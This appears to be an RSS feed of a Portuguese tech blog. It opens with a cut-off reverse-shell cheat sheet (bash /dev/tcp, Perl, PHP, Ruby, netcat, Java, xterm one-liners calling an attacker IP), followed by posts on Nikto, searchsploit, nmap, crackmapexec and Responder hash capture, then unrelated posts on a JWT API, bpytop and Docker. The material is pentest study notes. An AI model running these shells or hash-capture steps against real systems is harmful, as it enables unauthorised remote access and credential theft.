bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; PHP =====================
php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; Ruby =====================
ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
    </item>
    <item>
      <title>Nikto</title>
      <link>https://fxshelll.github.io/posts/nikto/</link>
      <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/nikto/</guid>
      <description>NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
Configura√ß√µes incorretas de servidor e software Arquivos e programas padr√£o Arquivos e programas inseguros Servidores e programas desatualizados N√£o √© necess√°rio fazer a instala√ß√£o do mesmo pois ele √© um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter .</description>
      <content:encoded><![CDATA[NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
Configura√ß√µes incorretas de servidor e software Arquivos e programas padr√£o Arquivos e programas inseguros Servidores e programas desatualizados N√£o √© necess√°rio fazer a instala√ß√£o do mesmo pois ele √© um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h &#43; alvo (por padr√£o setada porta 80) -o posso gerar relat√≥rio em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, √© necess√°rio colocar o &amp;lsquo;http&amp;rsquo; na frente.
ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
]]></content:encoded>
    </item>
    <item>
      <title>Searchexploit</title>
      <link>https://fxshelll.github.io/posts/searchexploit/</link>
      <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/searchexploit/</guid>
      <description>SEARCHSPLOIT ================
Searchsploit, √© uma ferramenta de pesquisa de linha de comando do Exploit-DB que tamb√©m permite que voc√™ leve uma c√≥pia do Exploit Database com voc√™, aonde quer que voc√™ v√°. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua c√≥pia do reposit√≥rio com check-out local. Esse recurso √© particularmente √∫til para avalia√ß√µes de seguran√ßa em redes segregadas ou com falta de ar sem acesso √† Internet.</description>
      <content:encoded><![CDATA[SEARCHSPLOIT ================
Searchsploit, √© uma ferramenta de pesquisa de linha de comando do Exploit-DB que tamb√©m permite que voc√™ leve uma c√≥pia do Exploit Database com voc√™, aonde quer que voc√™ v√°. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua c√≥pia do reposit√≥rio com check-out local. Esse recurso √© particularmente √∫til para avalia√ß√µes de seguran√ßa em redes segregadas ou com falta de ar sem acesso √† Internet.
Com as informa√ß√µes dos servi√ßos coletados pelo NMAP, seria maneiro procurar no searchsploit se este servi√ßo cont√©m alguma vulnerabilidade, procurando um exploit para ele.
Neste caso podemos usar o searchsploit da seguinte maneira:
fpmatta@T-REX ~&amp;gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &amp;#39;CWD&amp;#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- Para atualizar a base do searchsploit fa√ßa:
$ searchsploit -u
Se n√£o tiver ele instalado no seu S.O (caso n√£o esteja utilizando o Kali linux):
Clone o reposit√≥rio, adicione o bin√°rio ao seu $PATH e edite o arquivo de configura√ß√£o para refletir o caminho do git:
$ sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
$ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
]]></content:encoded>
    </item>
    <item>
      <title>NMAP</title>
      <link>https://fxshelll.github.io/posts/toolsforpentest/</link>
      <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/toolsforpentest/</guid>
      <description>NMAP ================
O Nmap (‚ÄúNetwork Mapper‚Äù) √© uma ferramenta de c√≥digo aberto para explora√ß√£o de rede e auditoria de seguran√ßa. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais servi√ßos ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras caracter√≠sticas. o N nor utilizado para audito seg adm e sistemas e red √∫ti rot omo invent√°rio d ger ser atu ados, e monitora disponibilidade de servi√ßo.</description>
      <content:encoded><![CDATA[NMAP ================
O Nmap (‚ÄúNetwork Mapper‚Äù) √© uma ferramenta de c√≥digo aberto para explora√ß√£o de rede e auditoria de seguran√ßa. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais servi√ßos ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras caracter√≠sticas. o N nor utilizado para audito seg adm e sistemas e red √∫ti rot omo invent√°rio d ger ser atu ados, e monitora disponibilidade de servi√ßo.
Para cada caso de enumera√ß√£o e circunst√¢ncias, existe flags especificas para cada tipo de alvo, geralmente dou um scan superficial no inicio, e depois utilizo algo mais profundo. As flags que mais utilizo s√£o as seguintes:
nmap -sV -sC -Pn -T4 -v -p- &amp;ndash;min-rate=10000 Identifica hosts ativos com a porta 445 aberta
nmap &amp;ndash;open -v -sS -p 445 -Pn 293.268.20.0/34 -oG smb.txt Cria arquivo com uma sa√≠da mais limpa, somente IPs
cat smb.txt |grep &amp;ldquo;Up&amp;rdquo;|cut -d &amp;quot;&amp;quot; -f2 &amp;gt; targets Canivete sui√ßo para enumerar os hosts (nome,dominio..)
crackmapexec smb targets Capturar hashes NBT-NS / LLMNR
Alterar o arquivo /etc/responder/Responder.conf
; Specific IP Addresses to respond to (default = All) ; Example: RespondTo = 10.20.1.100-150, 10.20.3.10 RespondTo = &amp;lt;host_1&amp;gt;&amp;lt;host_2&amp;gt;&amp;lt;host_3&amp;gt;&amp;lt;host_4&amp;gt;&amp;lt;&amp;hellip;&amp;gt;
responder -l -Prv Tamb√©m s√£o muito utilizadas as flags abaixo desde o mais simples para um scan mais completo.
Varredura de porta TCP SYN (padr√£o)
nmap -sS 192.168.1.1 Tentativas para determinar a vers√£o do servi√ßo em execu√ß√£o na porta
nmap -sV 192.168.1.1 Scan com scripts NSE padr√£o. Considerado √∫til para descoberta e seguran√ßa
nmap -sC 192.168.1.1 Desative a descoberta de host. Somente varredura de porta.
nmap -Pn 192.168.1.1-5 Scan agressivo (4) mais acelerado, utilizar somente quando voc√™ estiver em uma rede razoavelmente r√°pida e confi√°vel.
nmap -T4 192.168.1.1 Aumente o n√≠vel de verbosidade (-v ou use -vv mais para obter um efeito maior)
nmap -v 192.168.1.1 Envie pacotes n√£o mais lentos que &amp;lt;n√∫mero&amp;gt; por segundo. (&amp;ndash;min-rate)
nmap --min-rate=1000 192.168.1.1 Envie pacotes n√£o mais rapidos que &amp;lt;n√∫mero&amp;gt; por segundo. (&amp;ndash;max-rate)
nmap --max-rate=1000 192.168.1.1 Efetua o handshake triplo do TCP. O Nmap solicita ao sistema operacional subjacente que estabele√ßa uma conex√£o com o destino na porta especificada.
nmap -sT 192.168.1 Envia um SYN TCP para ver se a porta de destino responde com um SYN ACK (porta aberta) ou um RST (porta fechada). Tamb√©m conhecida como varredura semi-aberta, pois n√£o conclui o handshake do TCP. Esse √© o padr√£o para usu√°rios root.
nmap -sS 192.168.1 Realiza uma varredura UDP. Como o UDP n√£o usa um handshake, um servi√ßo escutando uma porta UDP pode n√£o enviar nenhuma resposta. As portas que enviam uma resposta s√£o exibidas como abertas. -sU (varredura UDP).
nmap -sU 192.168.1.50 Ativa a detec√ß√£o do SO.
nmap -O 192.168.1.50 Quantos hosts ativos.
nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativos, pode personalizar com suas flags favoritas.
# nano maroto_scan.sh
#!/bin/bash echo &amp;#34;Insira o Range:&amp;#34; read RANGE nmap -sP $RANGE | grep for | cut -d &amp;#34; &amp;#34; -f5 echo &amp;#34;Isso a√™&amp;#34; Para tornar execut√°vel o script fa√ßa:
# chmod &#43;x maroto_scan.sh &amp;gt;&amp;gt;Resumo Porta aberta = SYN &#43; ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos servi√ßos, por√©m bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o max√≠mo que conseguir) ]]></content:encoded>
    </item>
    <item>
      <title>API de usu√°rios e autentica√ß√£o</title>
      <link>https://fxshelll.github.io/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</link>
      <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</guid>
      <description>API REST desenvolvida com Node.js e MongoDB para gerenciamento de usu√°rios e autentica√ß√£o via JWT.
Ideal para aplica√ß√µes que exigem controle de acesso, login seguro e rotas protegidas.
git: https://github.com/fxshelll/api-users-auth Tecnologias Utilizadas Node.js &#43; Express ‚Äî Framework para constru√ß√£o da API MongoDB &#43; Mongoose ‚Äî Banco de dados NoSQL JWT (JSON Web Token) ‚Äî Autentica√ß√£o segura bcrypt ‚Äî Criptografia de senhas dotenv ‚Äî Gerenciamento de vari√°veis de ambiente Swagger ‚Äî Documenta√ß√£o dos endpoints Docker &#43; Docker Compose ‚Äî Containeriza√ß√£o da aplica√ß√£o Jest &#43; Supertest ‚Äî Testes automatizados Estrutura do Projeto api-users-auth/ ‚îú‚îÄ‚îÄ üìÇ src/ # C√≥digo-fonte principal ‚îÇ ‚îú‚îÄ‚îÄ üìÇ config/ # Configura√ß√£o da conex√£o com MongoDB ‚îÇ ‚îú‚îÄ‚îÄ üìÇ controllers/ # Fun√ß√µes que recebem as requisi√ß√µes HTTP ‚îÇ ‚îú‚îÄ‚îÄ üìÇ middleware/ # Middlewares de autentica√ß√£o e autoriza√ß√£o ‚îÇ ‚îú‚îÄ‚îÄ üìÇ models/ # Modelos de dados (ex: User) ‚îÇ ‚îú‚îÄ‚îÄ üìÇ routes/ # Defini√ß√£o das rotas da API ‚îÇ ‚îú‚îÄ‚îÄ üìÇ services/ # Regras de neg√≥cio (ex: login, cadastro) ‚îÇ ‚îî‚îÄ‚îÄ üìÇ utils/ # Fun√ß√µes auxiliares (ex: hash de senha, JWT) ‚îÇ ‚îú‚îÄ‚îÄ üìÇ tests/ # Testes automatizados com Jest e Supertest ‚îú‚îÄ‚îÄ üìÇ docs/ # Documenta√ß√£o adicional (ex: diagramas, notas) ‚îÇ ‚îú‚îÄ‚îÄ üìÑ .</description>
      <content:encoded><![CDATA[API REST desenvolvida com Node.js e MongoDB para gerenciamento de usu√°rios e autentica√ß√£o via JWT.
Ideal para aplica√ß√µes que exigem controle de acesso, login seguro e rotas protegidas.
git: https://github.com/fxshelll/api-users-auth Tecnologias Utilizadas Node.js &#43; Express ‚Äî Framework para constru√ß√£o da API MongoDB &#43; Mongoose ‚Äî Banco de dados NoSQL JWT (JSON Web Token) ‚Äî Autentica√ß√£o segura bcrypt ‚Äî Criptografia de senhas dotenv ‚Äî Gerenciamento de vari√°veis de ambiente Swagger ‚Äî Documenta√ß√£o dos endpoints Docker &#43; Docker Compose ‚Äî Containeriza√ß√£o da aplica√ß√£o Jest &#43; Supertest ‚Äî Testes automatizados Estrutura do Projeto api-users-auth/ ‚îú‚îÄ‚îÄ üìÇ src/ # C√≥digo-fonte principal ‚îÇ ‚îú‚îÄ‚îÄ üìÇ config/ # Configura√ß√£o da conex√£o com MongoDB ‚îÇ ‚îú‚îÄ‚îÄ üìÇ controllers/ # Fun√ß√µes que recebem as requisi√ß√µes HTTP ‚îÇ ‚îú‚îÄ‚îÄ üìÇ middleware/ # Middlewares de autentica√ß√£o e autoriza√ß√£o ‚îÇ ‚îú‚îÄ‚îÄ üìÇ models/ # Modelos de dados (ex: User) ‚îÇ ‚îú‚îÄ‚îÄ üìÇ routes/ # Defini√ß√£o das rotas da API ‚îÇ ‚îú‚îÄ‚îÄ üìÇ services/ # Regras de neg√≥cio (ex: login, cadastro) ‚îÇ ‚îî‚îÄ‚îÄ üìÇ utils/ # Fun√ß√µes auxiliares (ex: hash de senha, JWT) ‚îÇ ‚îú‚îÄ‚îÄ üìÇ tests/ # Testes automatizados com Jest e Supertest ‚îú‚îÄ‚îÄ üìÇ docs/ # Documenta√ß√£o adicional (ex: diagramas, notas) ‚îÇ ‚îú‚îÄ‚îÄ üìÑ .env # Vari√°veis de ambiente (porta, URI, segredo JWT) ‚îú‚îÄ‚îÄ üìÑ .gitignore # Arquivos e pastas ignorados pelo Git ‚îú‚îÄ‚îÄ üìÑ Dockerfile # Configura√ß√£o do container da API ‚îú‚îÄ‚îÄ üìÑ docker-compose.yml # Orquestra√ß√£o dos containers (API &#43; MongoDB) ‚îú‚îÄ‚îÄ üìÑ README.md # Manual do projeto ‚îú‚îÄ‚îÄ üìÑ package.json # Configura√ß√£o do projeto Node.js ‚îî‚îÄ‚îÄ üìÑ swagger.yaml # Documenta√ß√£o dos endpoints via Swagger Tecnologias Node.js, Express, MongoDB (Mongoose), JWT, bcrypt, Swagger, Jest, Docker.
Como Rodar o Projeto Docker e Docker Compose instalados Node.js (opcional, para rodar localmente sem Docker) Rodando com Docker docker compose up --build Acesse: API: http://localhost:3000 Swagger: http://localhost:3000/api-docs
Autentica√ß√£o A autentica√ß√£o √© feita via JWT. Ap√≥s login, o token deve ser enviado no header:
exemplo, registro de usu√°rio:
‚ûú api-users-auth git:(master) ‚úó curl -X POST http://localhost:3000/auth/register \ -H &amp;#34;Content-Type: application/json&amp;#34; \ -d &amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;Felipe&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;felipe@example.com&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;senha123&amp;#34;}&amp;#39; {&amp;#34;user&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;Felipe&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;felipe@example.com&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;user&amp;#34;,&amp;#34;_id&amp;#34;:&amp;#34;691ccc9035416aa48b4176f6&amp;#34;,&amp;#34;createdAt&amp;#34;:&amp;#34;2025-11-18T19:44:16.950Z&amp;#34;,&amp;#34;updatedAt&amp;#34;:&amp;#34;2025-11-18T19:44:16.950Z&amp;#34;,&amp;#34;__v&amp;#34;:0},&amp;#34;token&amp;#34;:&amp;#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2OTFjY2M5MDM1NDE2YWE0OGI0MTc2ZjYiLCJlbWFpbCI6ImZlbGlwZUBleGFtcGxlLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzYzNDk1MDU2LCJleHAiOjE3NjM1ODE0NTZ9.ll6c7UcH7zrJRkZpTLOufvZv2UCjug5VZ5sFreJI9tw&amp;#34;}% Ele gera o ID do usu√°rio e o token.
]]></content:encoded>
    </item>
    <item>
      <title>bpytop</title>
      <link>https://fxshelll.github.io/posts/bpytop/</link>
      <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/bpytop/</guid>
      <description>
Monitor de recursos que mostra uso e estat√≠sticas de processador, mem√≥ria, discos, rede e processos. https://github.com/aristocratos/bpytop
sudo apt install bpytop </description>
      <content:encoded><![CDATA[
Monitor de recursos que mostra uso e estat√≠sticas de processador, mem√≥ria, discos, rede e processos. https://github.com/aristocratos/bpytop
sudo apt install bpytop ]]></content:encoded>
    </item>
    <item>
      <title>Escalabilidade e Conteineriza√ß√£o</title>
      <link>https://fxshelll.github.io/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</link>
      <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</guid>
      <description>Pense em um container como uma esp√©cie de caixinha isolada onde voc√™ coloca uma aplica√ß√£o e tudo que ela precisa para rodar: bibliotecas, depend√™ncias, arquivos de configura√ß√£o e recursos espec√≠ficos. Essa&amp;quot;caixinha&amp;quot; fica fechada, isolada do ambiente externo, garantindo que a aplica√ß√£o dentro dela sempre rode da mesma forma, n√£o importa onde ela esteja
Tecnicamente falando, um container √© um ambiente isolado no n√≠vel do sistema operacional. Diferente das m√°quinas virtuais (que simulam um computador completo, com sistema operacional e tudo), os containers compartilham o kernel (n√∫cleo) do sistema operacional do host.</description>
      <content:encoded><![CDATA[Pense em um container como uma esp√©cie de caixinha isolada onde voc√™ coloca uma aplica√ß√£o e tudo que ela precisa para rodar: bibliotecas, depend√™ncias, arquivos de configura√ß√£o e recursos espec√≠ficos. Essa&amp;quot;caixinha&amp;quot; fica fechada, isolada do ambiente externo, garantindo que a aplica√ß√£o dentro dela sempre rode da mesma forma, n√£o importa onde ela esteja
Tecnicamente falando, um container √© um ambiente isolado no n√≠vel do sistema operacional. Diferente das m√°quinas virtuais (que simulam um computador completo, com sistema operacional e tudo), os containers compartilham o kernel (n√∫cleo) do sistema operacional do host. Isso significa que containers n√£o precisam carregar um sistema inteiro para funcionar ‚Äî eles reutilizam o que j√° existe no host, reduzindo drasticamente o uso de recursos.
Dois mecanismos principais do kernel Linux tornam isso poss√≠vel: Namespaces: s√£o respons√°veis por criar ambientes isolados. Por exemplo, cada container tem seu pr√≥prio espa√ßo para processos, rede, sistema de arquivos e usu√°rios. Isso garante que um container n√£o interfira no outro e que aplica√ß√µes possam rodar lado a lado, sem conflitos;
Cgroups (ControlGroups): s√£o utilizados pra controlar a quantidade de recursos (mem√≥ria, CPU, disco) que cada container pode utilizar. Assim, mesmo que um container tente consumir mais recursos que o previsto, ele fica limitado ao que foi definido, garantindo estabilidade ao sistema inteiro.
Isso tudo importa por que? Porque essa combina√ß√£o permite que voc√™ tenha um ambiente padronizado, previs√≠vel e extremamente port√°til. Uma aplica√ß√£o empacotada em um container roda exatamente do mesmo jeito na sua m√°quina, num servidor de teste, em produ√ß√£o ou at√© mesmo na nuvem. Isso elimina aquele velho problema de ‚Äúna minha m√°quina funciona‚Äù.
Se voc√™ desenvolve uma aplica√ß√£o web que usa Node.js em uma vers√£o espec√≠fica, antes voc√™ precisava instalar essa vers√£o exata na m√°quina que rodaria sua aplica√ß√£o em produ√ß√£o. Com containers, voc√™ simplesmente cria uma imagem que j√° cont√©m exatamente essa vers√£o do Node, as depend√™ncias e os arquivos necess√°rios. Ao subir essa imagem num servidor (com Docker, por exemplo), voc√™ garante que tudo rode exatamente como voc√™ planejou ‚Äî sem erros surpresa.
Fluxo: Comandos b√°sicos do Docker: Listar containers em execu√ß√£o: docker ps; Listar todos os containers (inclusive parados): docker ps ‚Äìa; Executar um container a partir de uma imagem: docker run nome-da-imagem. Exemplo: docker run hello-world; Executar um container interativo (com acesso ao terminal): docker run -it nome-da-imagem /bin/bash. Exemplo: docker run -it ubuntu bash; Parar um container em execu√ß√£o: docker stop id-ou-nome-do-container; Iniciar novamente um container parado: docker start id-ou-nome-do-container; Remover um container parado: docker rm id-ou-nome-do-container; For√ßar a remo√ß√£o de um container (mesmo que ainda esteja rodando): docker rm -f id-ou-nome-do-container. Listar imagens dispon√≠veis localmente: docker images; Baixar uma imagem espec√≠fica do Docker Hub: docker pull nome-da-imagem. Exemplo: docker pull node:20-alpine; Remover uma imagem localmente armazenada: docker rmi nome-ou-id-da-imagem. Visualizar logs de execu√ß√£o do container: docker logs id-ou-nome-do-container; Obter informa√ß√µes detalhadas sobre um container ou imagem: docker inspect id-ou-nome-do-container. Renomear um container: docker rename nome-antigo nome-novo; Executar comandos em containers j√° em execu√ß√£o: docker exec -it nome-do-container comando. Exemplo: docker exec -it meu-container bash; Copiar arquivos do host para o container: docker cp arquivo host:/caminho-container; Copiar arquivos do container para o host: docker cp container:/caminho-arquivo destino-host. Remover containers parados automaticamente: docker container prune; Remover imagens n√£o utilizadas: docker image prune; Limpar todos os recursos Docker n√£o utilizados: docker system prune. Liberar aplica√ß√£o para acesso no host: docker run -p 80:80 nginx Dockerfile (FROM, RUN, CMD, COPY, WORKDIR) Se tem uma coisa que voc√™ vai escrever muito ao trabalhar com Docker, √© o tal do Dockerfile. Ele √© s√≥ um arquivo de texto, mas com muito poder: √© ali que voc√™ define o passo a passo para construir a imagem que vai rodar sua aplica√ß√£o. Funciona como um script declarativo ‚Äî voc√™ diz o que quer que aconte√ßa e o Docker constr√≥i.
O processo √© bem linear, e com o tempo voc√™ decora a ordem das instru√ß√µes. Mas no come√ßo, vale entender o papel de cada uma.
FROM Tudo come√ßa com o FROM. √â aqui que voc√™ escolhe a base da sua imagem. Pode ser o Node, o Python, o Ubuntu ou qualquer outra coisa. O mais comum √© usar imagens oficiais que j√° v√™m prontas no Docker Hub.
Exemplo: FROM node:20
Isso quer dizer: ‚Äúpegue a imagem do Node na vers√£o 20 e comece a construir em cima dela‚Äù.
WORKDIR Depois disso, √© comum definir um diret√≥rio de trabalho com WORKDIR. Isso nada mais √© do que dizer: ‚Äúa partir de agora, tudo que eu fizer vai ser dentro desta pasta aqui‚Äù. Isso evita que voc√™ tenha que dar comandos com caminhos longos o tempo todo.
Exemplo: WORKDIR /app
COPY A√≠ vem o COPY, que serve para colocar seus arquivos dentro da imagem. Ele seleciona o que est√° em sua m√°quina e joga dentro da imagem que est√° sendo constru√≠da.
Exemplo: COPY . /app
Isso copia tudo o que est√° no diret√≥rio atual para o /app da imagem.
RUN Com os arquivos no lugar, voc√™ pode executar comandos com RUN. Ele √© muito usado para instalar depend√™ncias, criar pastas, mover arquivos, o que for necess√°rio durante a constru√ß√£o da imagem.
Exemplo: RUN npminstall
Esse comando vai rodar dentro da imagem e o resultado fica salvo como uma camada nova.
CMD Por fim, vem o CMD, que define o comando que vai rodar quando o container for iniciado. √â como dizer: ‚Äúquando algu√©m rodar essa imagem, execute isso aqui por padr√£o‚Äù.
Exemplo: CMD [&amp;ldquo;node&amp;rdquo;, &amp;ldquo;index.js&amp;rdquo;]
Isso vai rodar o index.js usando o Node quando o container subir.
A ordem dessas instru√ß√µes importa, principalmente porque o Docker guarda o cache de cada etapa. Se voc√™ mudar algo no topo do Dockerfile, ele vai reconstruir tudo abaixo. Agora, se voc√™ s√≥ mexer no CMD, por exemplo, ele reaproveitar√° o restante.
Com o tempo voc√™ vai aprender a montar Dockerfiles mais limpos, diretos e f√°ceis de manter. Mas comece entendendo bem o b√°sico: que o Dockerfile √© onde voc√™ escreve a l√≥gica de constru√ß√£o da sua imagem. Sem m√°gica, sem mist√©rio. S√≥ pr√°tica e clareza.
# Etapa 1 - build FROM node:20 AS build WORKDIR /app COPY . . RUN npm install &amp;amp;&amp;amp;npm run build # Etapa 2 - produ√ß√£o FROM node:20-slim WORKDIR /app COPY --from=build /app/dist ./dist CMD [&amp;#34;node&amp;#34;, &amp;#34;dist/index.js&amp;#34;] A primeira etapa instala tudo, roda o build, e a segunda s√≥ carrega o resultado. Nada de node_modules, ferramentas de build ou arquivos tempor√°rios indo parar na imagem final.
Esse padr√£o √© bem comum em projetos mais maduros, porque ajuda a deixar o deploy mais leve e evita que coisas desnecess√°rias (ou at√© perigosas) acabem indo parar em produ√ß√£o.
Se voc√™ ainda n√£o usa, comece a testar em projetos pequenos. Depois que voc√™ se acostumar, vira um padr√£o.
Multibuildinds Seguran√ßa em containers: resumo Containers e VMs: eles compartilham o kernel com o host, ent√£o se houver escape, o risco √© grande. Namespaces: isolam recursos como processos, rede, usu√°rios e sistema de arquivos, garantindo que o container veja apenas o que est√° dentro dele. Capabilities: controlam permiss√µes do processo. O root no container √© limitado por padr√£o. √â poss√≠vel remover (--cap-drop) ou adicionar (--cap-add) capacidades, seguindo o princ√≠pio do menor privil√©gio. Seccomp: funciona como um firewall de syscalls, bloqueando chamadas perigosas. O Docker j√° traz um perfil padr√£o, mas √© poss√≠vel criar perfis personalizados. Boas pr√°ticas adicionais: n√£o rodar como root, usar imagens m√≠nimas, manter depend√™ncias atualizadas e aplicar patches regularmente. Usu√°rios n√£o root e boas pr√°ticas de permiss√µes Agora vamos falar de um dos t√≥picos mais importantes ‚Äî e muitas vezes ignorado ‚Äî quando a gente come√ßa a colocar containers em produ√ß√£o: rodar como root ou n√£o. Spoiler: a resposta quase sempre √© n√£o.
Por padr√£o, quando voc√™ sobe um container, ele roda como root. E o root dentro do container √© praticamente o mesmo root do host. Mesmo que ele esteja tecnicamente isolado, isso √© um risco enorme. Se algu√©m conseguir escapar do container (sim, isso pode acontecer), vai ter acesso privilegiado ao seu sistema. E a√≠, j√° era.
A primeira boa pr√°tica aqui √© criar um usu√°rio n√£o privilegiado dentro da imagem, e for√ßar o container a rodar com ele. Voc√™ pode fazer isso com o comando adduser (ou useradd, dependendo da imagem base) e depois usar USER nomedousuario. E mais: se os arquivos da aplica√ß√£o forem copiados para o container, o ideal √© j√° definir o dono desses arquivos com &amp;ndash;chown.
FROM node:18-alpine RUN adduser -D appuser USER appuser WORKDIR /app COPY --chown=appuser . . RUN npm ci CMD [&amp;#34;npm&amp;#34;, &amp;#34;start&amp;#34;] Dockerignore e build context Quando voc√™ roda um docker build, o Docker precisa saber o que ele vai copiar para o contexto de build ‚Äî basicamente, tudo que est√° na pasta onde voc√™ roda o comando (ou no caminho que voc√™ passar).
Isso √© o chamado build context. E √© aqui que muita gente se atrapalha.
Por padr√£o, se voc√™ n√£o filtrar nada, o Docker vai tentar mandar tudo que est√° naquela pasta para o processo de build. Isso inclui .git, node_modules, arquivos grandes, segredos&amp;hellip; tudo mesmo. Isso n√£o s√≥ deixa o build mais lento, como tamb√©m pode vazar dados sens√≠veis para a imagem final.
√â a√≠ que entra o .dockerignore. Ele funciona como um .gitignore, s√≥ que para build. Voc√™ lista nele o que n√£o deve ser enviado para o build context ‚Äî simples assim:
.git node_modules .env .vscode *.log Com isso, o Docker ignora essas pastas e arquivos quando empacota o build context. Resultado? Build mais r√°pido, imagem menor e mais segura.
Ali√°s, se o seu build estiver demorando demais ou parecendo pesado demais, confira o que est√° no contexto. Muita gente manda gigas sem saber, s√≥ porque esqueceu de ignorar.
Outra boa pr√°tica √© sempre rodar o docker build o mais perto poss√≠vel do Dockerfile, e garantir que sua estrutura de pastas esteja organizada. Isso evita surpresas.
Enfim, usar .dockerignore √© obrigat√≥rio se voc√™ quer construir imagens limpas, seguras e eficientes. N√£o √© frescura ‚Äî √© parte do b√°sico bem feito.
Estrat√©gias de cache em builds com npm, pip, etc Se voc√™ j√° rodou um docker build mais de uma vez, talvez tenha notado: √†s vezes o build voa, √†s vezes demora uma eternidade. A diferen√ßa quase sempre est√° no cache.
